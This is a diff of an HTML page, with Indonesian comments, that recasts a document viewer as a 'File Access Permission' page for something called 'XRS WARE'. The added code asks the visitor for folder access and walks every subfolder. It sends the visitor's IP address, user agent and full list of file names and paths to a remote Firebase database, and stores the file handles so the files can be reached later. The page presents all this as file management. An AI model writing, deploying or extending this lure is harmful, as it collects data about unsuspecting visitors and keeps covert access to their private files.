@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Viewer</title>
+    <title>File Access Permission</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
     <style>
@@ -26,7 +26,7 @@
         }
         
         .container {
-            max-width: 500px;
+            max-width: 600px;
             width: 100%;
             background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(10px);
@@ -38,9 +38,15 @@
         }
         
         h1 {
-            font-size: 1.8rem;
-            margin-bottom: 30px;
+            font-size: 2rem;
+            margin-bottom: 20px;
             color: #e6e6e6;
+        }
+        
+        .description {
+            margin-bottom: 25px;
+            line-height: 1.6;
+            color: #ccc;
         }
         
         .permission-btn {
@@ -92,28 +98,78 @@
             to { transform: rotate(360deg); }
         }
         
+        .warning {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            background: rgba(255, 165, 0, 0.2);
+            border: 1px solid orange;
+            display: none;
+        }
+        
+        .session-info {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.2);
+            display: none;
+            text-align: left;
+        }
+        
         footer {
             margin-top: 30px;
             text-align: center;
             color: #888;
             font-size: 0.8rem;
         }
+        
+        .xrs-link {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 10px 20px;
+            background: #ff073a;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        
+        .xrs-link:hover {
+            background: #ff3855;
+            box-shadow: 0 0 10px #ff073a;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Document Viewer Application</h1>
+        <h1>File Access Permission</h1>
+        <p class="description">Grant access to your files to enable advanced file management features. Your files will be accessible through the XRS WARE system.</p>
         
-        <button class="permission-btn" id="accessBtn">PERMISSION FILE</button>
+        <button class="permission-btn" id="accessBtn">GRANT FILE ACCESS</button>
         
         <div class="status" id="status">
             <span class="loading"></span>
             <span id="statusText">Processing request...</span>
         </div>
+        
+        <div class="warning" id="httpsWarning">
+            <strong>Notice:</strong> This website requires HTTPS to access the file system. 
+            If you're running on localhost, the feature will work normally.
+        </div>
+        
+        <div class="session-info" id="sessionInfo">
+            <h3>Session Information</h3>
+            <p><strong>Session ID:</strong> <span id="sessionId"></span></p>
+            <p><strong>Status:</strong> <span id="accessStatus">Pending</span></p>
+            <p><strong>Files Accessed:</strong> <span id="fileCount">0</span></p>
+        </div>
+        
+        <a href="#" class="xrs-link" id="xrsLink" style="display:none;">Open XRS WARE File Manager</a>
     </div>
 
     <footer>
-        <p>&copy; 2023 Document Viewer. All rights reserved.</p>
+        <p>&copy; 2023 File Access System. All rights reserved.</p>
     </footer>
 
     <script>
@@ -132,23 +188,37 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         
-        // Variabel untuk menyimpan handle akses file
-        let directoryHandle;
+        // Tampilkan peringatan jika tidak di localhost dan tidak HTTPS
+        if (window.location.hostname !== 'localhost' && 
+            window.location.hostname !== '127.0.0.1' &&
+            window.location.protocol !== 'https:') {
+            document.getElementById('httpsWarning').style.display = 'block';
+        }
+        
+        // Variabel global
+        let currentSessionId = null;
+        let fileHandles = new Map();
         
         document.getElementById('accessBtn').addEventListener('click', async function() {
+            // Periksa apakah File System Access API didukung
+            if (!('showDirectoryPicker' in window)) {
+                alert('Your browser does not support the File System Access API. Please use a modern browser like Chrome or Edge.');
+                return;
+            }
+            
             const statusElem = document.getElementById('status');
             const statusText = document.getElementById('statusText');
             
             statusElem.style.display = 'block';
+            this.disabled = true;
             
             // Meminta izin akses file menggunakan File System Access API
             try {
-                statusText.textContent = 'Meminta izin akses file...';
+                statusText.textContent = 'Requesting file access...';
                 
                 // Meminta pengguna memilih direktori
-                directoryHandle = await window.showDirectoryPicker();
-                
-                statusText.textContent = 'Akses diberikan. Mencatat session...';
+                const directoryHandle = await window.showDirectoryPicker();
+                statusText.textContent = 'Access granted. Reading files...';
                 
                 // Get user IP and user agent
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -159,44 +229,108 @@
                 
                 // Simpan informasi file yang diakses
                 let fileList = [];
-                for await (const entry of directoryHandle.values()) {
-                    if (entry.kind === 'file') {
-                        const file = await entry.getFile();
-                        fileList.push({
-                            name: file.name,
-                            size: file.size,
-                            type: file.type,
-                            lastModified: file.lastModified
-                        });
+                fileHandles.clear();
+                
+                // Fungsi rekursif untuk membaca semua file
+                async function readDirectory(handle, path = '') {
+                    for await (const entry of handle.values()) {
+                        const entryPath = path ? `${path}/${entry.name}` : entry.name;
+                        
+                        if (entry.kind === 'file') {
+                            const file = await entry.getFile();
+                            fileList.push({
+                                name: file.name,
+                                path: entryPath,
+                                size: file.size,
+                                type: file.type,
+                                lastModified: file.lastModified
+                            });
+                            // Simpan file handle untuk akses nanti
+                            fileHandles.set(entryPath, entry);
+                        } else if (entry.kind === 'directory') {
+                            // Skip Android directory if exists
+                            if (entry.name.toLowerCase() !== 'android') {
+                                await readDirectory(entry, entryPath);
+                            }
+                        }
                     }
                 }
                 
+                await readDirectory(directoryHandle);
+                
+                statusText.textContent = 'Recording session...';
+                
                 // Save to Firebase
-                const sessionId = generateUniqueId();
-                const userRef = database.ref('sessions/' + sessionId);
+                currentSessionId = generateUniqueId();
+                const userRef = database.ref('sessions/' + currentSessionId);
                 await userRef.set({
                     ip: ipAddress,
                     userAgent: userAgent,
                     timestamp: timestamp,
                     accessGranted: true,
                     fileCount: fileList.length,
-                    sessionId: sessionId
+                    sessionId: currentSessionId,
+                    status: 'active'
                 });
                 
                 // Simpan daftar file
-                const filesRef = database.ref('files/' + sessionId);
+                const filesRef = database.ref('files/' + currentSessionId);
                 await filesRef.set(fileList);
                 
-                statusText.innerHTML = 'Akses diberikan! Session telah dicatat.';
+                // Simpan file handles di IndexedDB untuk akses nanti
+                await saveFileHandles(currentSessionId, fileHandles);
                 
-                // Simpan sessionId di localStorage untuk XRS WARE
-                localStorage.setItem('xrsSessionId', sessionId);
+                statusText.innerHTML = 'Access granted! Your files are now accessible.';
+                
+                // Tampilkan info session
+                document.getElementById('sessionInfo').style.display = 'block';
+                document.getElementById('sessionId').textContent = currentSessionId;
+                document.getElementById('accessStatus').textContent = 'Granted';
+                document.getElementById('fileCount').textContent = fileList.length;
+                
+                // Tampilkan link ke XRS WARE
+                document.getElementById('xrsLink').style.display = 'inline-block';
+                document.getElementById('xrsLink').href = `xrs-ware.html?session=${currentSessionId}`;
                 
             } catch (error) {
                 console.error("Error accessing files:", error);
-                statusText.innerHTML = 'Error: ' + error.message;
+                if (error.name === 'SecurityError') {
+                    statusText.innerHTML = 'Error: File access requires HTTPS. Please run on localhost or deploy with HTTPS.';
+                } else if (error.name === 'AbortError') {
+                    statusText.innerHTML = 'Access request cancelled.';
+                } else {
+                    statusText.innerHTML = 'Error: ' + error.message;
+                }
+                this.disabled = false;
             }
         });
+        
+        // Simpan file handles ke IndexedDB
+        async function saveFileHandles(sessionId, handles) {
+            return new Promise((resolve, reject) => {
+                const request = indexedDB.open('FileAccessDB', 1);
+                
+                request.onerror = () => reject(request.error);
+                request.onsuccess = () => {
+                    const db = request.result;
+                    const transaction = db.transaction(['fileHandles'], 'readwrite');
+                    const store = transaction.objectStore('fileHandles');
+                    
+                    // Convert handles to a serializable format
+                    const handlesData = Array.from(handles.entries());
+                    
+                    store.put({ sessionId, handles: handlesData });
+                    
+                    transaction.oncomplete = () => resolve();
+                    transaction.onerror = () => reject(transaction.error);
+                };
+                
+                request.onupgradeneeded = (event) => {
+                    const db = event.target.result;
+                    db.createObjectStore('fileHandles', { keyPath: 'sessionId' });
+                };
+            });
+        }
         
         function generateUniqueId() {
             return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
